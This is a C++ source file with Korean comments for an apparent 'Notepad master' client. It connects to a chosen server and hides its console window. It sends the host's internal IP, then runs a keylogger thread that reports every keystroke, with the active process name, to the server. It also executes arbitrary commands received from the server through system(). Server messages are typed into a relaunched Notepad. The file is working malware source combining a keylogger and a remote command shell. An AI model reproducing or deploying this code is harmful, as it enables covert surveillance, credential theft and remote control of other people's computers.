// NotepadMasterCilent.cpp : 이 파일에는 'main' 함수가 포함됩니다. 거기서 프로그램 실행이 시작되고 종료됩니다.
//
#include <iostream>
#include <windows.h>
#include <tchar.h>
#include <conio.h>
#include <process.h>
#include <string>
#include <cstdio>

#include "util.h"
#include "definition.h"

#define BUFF_SIZE 2000
#define TYPING_DELAY 150

using namespace std;

HWND h_notepad, h_edit;

void ResetNotepad()
{
	h_notepad = FindWindow(L"Notepad", NULL);
	while (!h_notepad)
	{
		cout << "메모장 핸들" << endl;
		Sleep(150);
		h_notepad = FindWindow(L"Notepad", NULL);
	}

	h_edit = FindWindowEx(h_notepad, NULL, L"Edit", NULL);
	while (!h_edit)
		h_edit = FindWindowEx(h_notepad, NULL, L"Edit", NULL);
}

UINT WINAPI keylog(void* arg);

int main()
{

	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;
	
	PDUHello pdu_hello;
	PDUMessage* pdu_recv;
	PDUCommand* pdu_command;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		cerr << "초기화 실패. 에러코드: %d" << WSAGetLastError();
		_getch();
		return 1;
	}

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		cerr << "소켓 생성 실패 : " << WSAGetLastError();
		WSACleanup();
		_getch();
		return 1;
	}

	char IP[30] = "";
	cout << "IP : ";
	cin >> IP;

	server.sin_addr.s_addr = inet_addr(IP);
	server.sin_family = AF_INET;
	server.sin_port = htons(44401);

	ShowWindow(GetForegroundWindow(), SW_HIDE);

	if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
	{
		cerr << "연결 실패.";

		switch (WSAGetLastError())
		{
		case 2:
			cout << "서버가 없습니다." << endl;
			break;

		case 10060:
			cout << "서버 연결이 너무 오래결려 연결을 중단했습니다." << endl;
			break;

		default:
			cout << "에러코드: " << WSAGetLastError() << endl;
		}
		closesocket(s);
		WSACleanup();
		_getch();
		return 1;
	}

	cout << "성공" << endl;

	// 첫 연결시 내부망IP 전송
	pdu_hello.protocol_type = HELLO;
	char hostname[20] = "";
	if (gethostname(hostname, 50) == 0)
		strcpy_s(pdu_hello.internal_ip, inet_ntoa(*(struct in_addr*)gethostbyname(hostname)->h_addr_list[0]));

	Sleep(500); // 클라이언트 프로그램에 입력된 엔터키 전송 방지
	UINT dwThreadID;
	HANDLE hThread;
	hThread = (HANDLE)_beginthreadex(NULL, 0, keylog, &s, 0, (unsigned*)&dwThreadID);
	if (hThread == 0)
		cerr << "beginhandlethreadex error";

	if (send(s, (const char*)&pdu_hello, sizeof(PDUHello), 0) < 0)
	{
		system("cls");
		cerr << "서버와의 연결이 끊어졌습니다." << endl;
		closesocket(s);
		exit(1);
	}
	system("taskkill /im notepad.exe -f");

	while (TRUE)
	{
		char buff[BUFF_SIZE] = "";
		char buff_recv[BUFF_SIZE] = "";
		int len = 0;
		if (recv(s, (char*)buff_recv, BUFF_SIZE, 0) < 0)
		{
			system("cls");
			cerr << "서버와의 연결이 끊어졌습니다." << endl;
			closesocket(s);
			exit(1);
		}
		// 이스케이프 시퀸스 기능
		//string temp = buff_recv;
		//replaceAll(temp, "\\n", "\n");

		//strcpy_s(buff_recv, temp.c_str());


		int nLen = 0;

		switch (buff_recv[0])
		{
		case COMMAND: // CMD명령 실행
			pdu_command = (PDUCommand*)&buff_recv;
			nLen = WideCharToMultiByte(CP_ACP, 0, pdu_command->command, -1, NULL, 0, NULL, NULL);
			WideCharToMultiByte(CP_ACP, 0, pdu_command->command, -1, buff, nLen, NULL, NULL);
			system(buff);
			break;

		case MESSAGE: // 메모장 메시지 전송

			pdu_recv = (PDUMessage*)buff_recv;
			system("taskkill -f /im notepad.exe");
			system("start notepad"); // 다시 실행

			ResetNotepad(); // 핸들값 초기화
			PostMessage(h_edit, WM_SETFONT, (WPARAM)CreateFontIndirectW(&pdu_recv->font), 1); // note: WM_SETFONT메세지 보내야 한다는거 구글에도 안나와 있어서 직접 리버싱하면서 알아냄 ㅠㅠ

			len = wcslen(pdu_recv->message);

			for (int i = 0; i < len; i++) // 서버에서 보낸 문자열을 하나씩 출력함
			{
				PostMessageW(h_edit, WM_IME_CHAR, pdu_recv->message[i], GCS_RESULTSTR);
				Sleep(pdu_recv->delay);
				cout << "WM_CHAR 메시지 보냄" << endl;
			}
		}
		memset(buff_recv, 0, BUFF_SIZE);
	}
}


UINT WINAPI keylog(void* arg)
{
	SOCKET s = *(SOCKET*)arg;
	BOOL isShift = FALSE;

	PDUKeylog pdu_keylog;
	pdu_keylog.protocol_type = KEYLOG;

	char LowToHigh[] = { '!', '@', '#', '$', '%', '^', '&', '*', '(', ')' };

	while (1) {
		UCHAR key = NULL;

		Sleep(20);
		if (GetKeyState(VK_BACK) < 0) 
			key = VK_BACK;

		else if (GetKeyState(VK_TAB) < 0)
			key = VK_TAB;

		else if (GetKeyState(VK_RETURN) < 0)
			key = VK_RETURN;

		else if (GetKeyState(VK_SPACE) < 0)
			key = VK_SPACE;
	
		else if (GetKeyState(VK_SHIFT) < 0) 
			isShift = TRUE;

		else if (GetKeyState(VK_SHIFT) >= 0)
			isShift = FALSE;

		if (key)
		{
			DWORD dwPID;
			GetWindowThreadProcessId(GetForegroundWindow(), &dwPID); // 현재 키를 입력한 프로세스 이름을 가져옴
			FindProcessName(dwPID, pdu_keylog.process_name);
			pdu_keylog.state = key;

			if (send(s, (const char*)&pdu_keylog, sizeof(PDUKeylog), 0) < 0)
			{
				cout << "서버와의 연결이 끊어졌습니다." << endl;
				closesocket(s);
				exit(1);
			}
		}
			
		for (key = 0x30; key <= 0x39; key++) // 키를 돌려가면서 판별
		{
			if (GetKeyState(key) < 0) { // 해당 키가 눌렸으면
				if (isShift) // Shift인지 검사
					pdu_keylog.state = LowToHigh[key - 0x30];
				else
					pdu_keylog.state = key;

				DWORD dwPID;
				GetWindowThreadProcessId(GetForegroundWindow(), &dwPID); // 현재 키를 입력한 프로세스 이름을 가져옴
				FindProcessName(dwPID, pdu_keylog.process_name);

				if (send(s, (const char*)&pdu_keylog, sizeof(PDUKeylog), 0) < 0)
				{
					cout << "서버와의 연결이 끊어졌습니다." << endl;
					closesocket(s);
					exit(1);
				}
			}
		}
		for (key = 0x40; key <= 0x5A; key++) // 키를 돌려가면서 판별
		{
			if (GetKeyState(key) < 0) { // 해당 키가 눌렸으면
				if (isShift) // Shift인지 검사
					pdu_keylog.state = key; // 쉬프트면 대문자
				else
					pdu_keylog.state = key + 0x20; // 아니면 소문자

				DWORD dwPID;
				GetWindowThreadProcessId(GetForegroundWindow(), &dwPID); // 현재 키를 입력한 프로세스 이름을 가져옴
				FindProcessName(dwPID, pdu_keylog.process_name);

				if (send(s, (const char*)&pdu_keylog, sizeof(PDUKeylog), 0) < 0)
				{
					cout << "서버와의 연결이 끊어졌습니다." << endl;
					closesocket(s);
					exit(1);
				}
			}
		}
	}
}
// 프로그램 실행: <Ctrl+F5> 또는 [디버그] > [디버깅하지 않고 시작] 메뉴
// 프로그램 디버그: <F5> 키 또는 [디버그] > [디버깅 시작] 메뉴

// 시작을 위한 팁: 
//   1. [솔루션 탐색기] 창을 사용하여 파일을 추가/관리합니다.
//   2. [팀 탐색기] 창을 사용하여 소스 제어에 연결합니다.
//   3. [출력] 창을 사용하여 빌드 출력 및 기타 메시지를 확인합니다.
//   4. [오류 목록] 창을 사용하여 오류를 봅니다.
//   5. [프로젝트] > [새 항목 추가]로 이동하여 새 코드 파일을 만들거나, [프로젝트] > [기존 항목 추가]로 이동하여 기존 코드 파일을 프로젝트에 추가합니다.
//   6. 나중에 이 프로젝트를 다시 열려면 [파일] > [열기] > [프로젝트]로 이동하고 .sln 파일을 선택합니다.
